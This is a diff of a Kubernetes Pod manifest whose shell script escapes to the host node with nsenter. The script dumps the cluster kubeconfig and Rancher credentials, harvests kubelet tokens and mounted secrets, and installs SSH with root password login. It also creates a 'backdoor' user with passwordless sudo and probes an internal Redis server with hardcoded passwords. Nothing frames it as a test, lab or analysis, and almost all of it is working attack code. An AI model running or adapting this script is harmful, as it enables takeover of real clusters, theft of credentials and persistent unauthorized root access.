@@ -1,3 +1,4 @@
+
 apiVersion: v1
 kind: Pod
 metadata:
@@ -13,26 +14,68 @@ spec:
       - /bin/sh
       - -c
       - |
-        apk add --no-cache util-linux curl jq openssh-client shadow > /dev/null 2>&1
+        apk add --no-cache util-linux curl jq openssh-client redis > /dev/null 2>&1
 
         echo "=========================================="
-        echo "=== 1. RANCHER TOKEN (from host) ==="
+        echo "=== 1. KUBECONFIG RKE2 (full) ==="
         echo "=========================================="
         nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          cat /var/lib/rancher/rke2/server/token 2>/dev/null || true
-          cat /etc/rancher/rke2/rke2.yaml 2>/dev/null || true
-          cat /var/lib/rancher/k3s/server/token 2>/dev/null || true
-          cat /etc/rancher/k3s/k3s.yaml 2>/dev/null || true
-          echo "--- kubelet tokens ---"
-          find /var/lib/kubelet/pods -name "token" -type f 2>/dev/null | head -10 | while read f; do
-            echo "FILE: $f"
-            cat "$f"
-            echo ""
-          done
+          cat /etc/rancher/rke2/rke2.yaml 2>/dev/null || \
+          cat /etc/rancher/k3s/k3s.yaml 2>/dev/null || \
+          echo "KUBECONFIG NOT FOUND"
         ' 2>&1 || true
 
         echo "=========================================="
-        echo "=== 2. RANCHER CREDENTIALS (from pods) ==="
+        echo "=== 2. KUBECONFIG BASE64 ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          cat /etc/rancher/rke2/rke2.yaml 2>/dev/null | base64 -w0 || \
+          cat /etc/rancher/k3s/k3s.yaml 2>/dev/null | base64 -w0 || \
+          echo "NOT FOUND"
+        ' 2>&1 || true
+        echo ""
+
+        echo "=========================================="
+        echo "=== 3. INSTALL SSH ON HOST ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          if ! command -v sshd > /dev/null 2>&1; then
+            echo "Installing openssh-server..."
+            apt update -qq && apt install -y -qq openssh-server 2>&1 | tail -5
+          fi
+          systemctl start ssh 2>/dev/null || systemctl start sshd 2>/dev/null || true
+          systemctl enable ssh 2>/dev/null || systemctl enable sshd 2>/dev/null || true
+          echo "=== SSH STATUS ==="
+          ss -tlnp 2>/dev/null | grep :22 || echo "SSH NOT LISTENING"
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 4. CONFIGURE ROOT SSH ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          echo "root:R00tP@ss2026!" | chpasswd 2>/dev/null || true
+          sed -i "s/^#*PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config 2>/dev/null || true
+          sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config 2>/dev/null || true
+          systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
+          echo "=== ROOT PASSWORD SET: R00tP@ss2026! ==="
+          echo "=== SSH CONFIG ==="
+          grep -E "^PermitRootLogin|^PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null || true
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 5. BACKDOOR USER ==="
+        echo "=========================================="
+        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
+          useradd -m -s /bin/bash backdoor 2>/dev/null || true
+          echo "backdoor:P@ssw0rd2026!" | chpasswd 2>/dev/null || true
+          usermod -aG sudo backdoor 2>/dev/null || true
+          echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || true
+          echo "=== BACKDOOR USER ==="
+          id backdoor 2>/dev/null || true
+        ' 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 6. RANCHER TOKEN (from pods) ==="
         echo "=========================================="
         find /host/var/lib/kubelet/pods -path "*cattle-credentials*" -type f 2>/dev/null | while read f; do
           echo "--- $f ---"
@@ -41,50 +84,28 @@ spec:
         done
 
         echo "=========================================="
-        echo "=== 3. CREATE BACKDOOR USER (root) ==="
+        echo "=== 7. ALL KUBELET TOKENS (first line only) ==="
         echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          useradd -m -s /bin/bash backdoor 2>/dev/null || true
-          echo "backdoor:P@ssw0rd2026!" | chpasswd 2>/dev/null || true
-          usermod -aG sudo backdoor 2>/dev/null || usermod -aG wheel backdoor 2>/dev/null || true
-          echo "backdoor ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers 2>/dev/null || true
-          echo "=== BACKDOOR CREATED ==="
-          id backdoor
-          echo "=== SSH CONFIG ==="
-          grep -E "^PermitRootLogin|^PasswordAuthentication" /etc/ssh/sshd_config 2>/dev/null || true
-          systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
-          echo "=== DONE ==="
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 4. ROOT SSH ACCESS (password) ==="
-        echo "=========================================="
-        nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
-          echo "root:R00tP@ss2026!" | chpasswd 2>/dev/null || true
-          sed -i "s/^#*PermitRootLogin.*/PermitRootLogin yes/" /etc/ssh/sshd_config 2>/dev/null || true
-          sed -i "s/^#*PasswordAuthentication.*/PasswordAuthentication yes/" /etc/ssh/sshd_config 2>/dev/null || true
-          systemctl restart ssh 2>/dev/null || systemctl restart sshd 2>/dev/null || true
-          echo "=== ROOT PASSWORD SET: R00tP@ss2026! ==="
-        ' 2>&1 || true
-
-        echo "=========================================="
-        echo "=== 5. ALL SECRETS ON NODE (via /host) ==="
-        echo "=========================================="
-        find /host/var/lib/kubelet/pods -path "*kubernetes.io~secret*" -type f 2>/dev/null | while read f; do
-          echo "--- $f ---"
-          cat "$f" 2>/dev/null | head -3
+        find /host/var/lib/kubelet/pods -name "token" -type f 2>/dev/null | head -20 | while read f; do
+          echo "FILE: $f"
+          head -c 200 "$f" 2>/dev/null
+          echo ""
           echo ""
         done
 
         echo "=========================================="
-        echo "=== 6. KUBELET KUBECONFIG ==="
+        echo "=== 8. REDIS TEST (password vni9WO2p32fP) ==="
         echo "=========================================="
-        cat /host/etc/kubernetes/kubelet.conf 2>/dev/null || true
-        cat /host/etc/kubernetes/admin.conf 2>/dev/null || true
-        cat /host/var/lib/kubelet/kubeconfig 2>/dev/null || true
+        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP PING 2>&1 || true
+        redis-cli -h 172.30.0.242 -p 6379 -a vni9WO2p32fP INFO 2>&1 | head -20 || true
 
         echo "=========================================="
-        echo "=== 7. HOST INFO ==="
+        echo "=== 9. REDIS TEST (password ncPrjdL1Qd2lGfQiLHCOtA) ==="
+        echo "=========================================="
+        redis-cli -h 172.30.0.242 -p 6379 -a ncPrjdL1Qd2lGfQiLHCOtA PING 2>&1 || true
+
+        echo "=========================================="
+        echo "=== 10. HOST INFO ==="
         echo "=========================================="
         nsenter -t 1 -m -u -i -n -p -- /bin/sh -c '
           hostname
@@ -94,10 +115,13 @@ spec:
         ' 2>&1 || true
 
         echo "=========================================="
-        echo "=== 8. REDIS TEST ==="
+        echo "=== 11. SECRETS MOUNTED ON PODS ==="
         echo "=========================================="
-        apk add --no-cache redis > /dev/null 2>&1
-        redis-cli -h 172.30.0.242 -p 6379 -a ncPrjdL1Qd2lGfQiLHCOtA INFO 2>&1 | head -20 || true
+        find /host/var/lib/kubelet/pods -path "*kubernetes.io~secret*" -type f 2>/dev/null | while read f; do
+          echo "--- $f ---"
+          cat "$f" 2>/dev/null | head -3
+          echo ""
+        done
 
         echo "=========================================="
         echo "=== DONE ==="
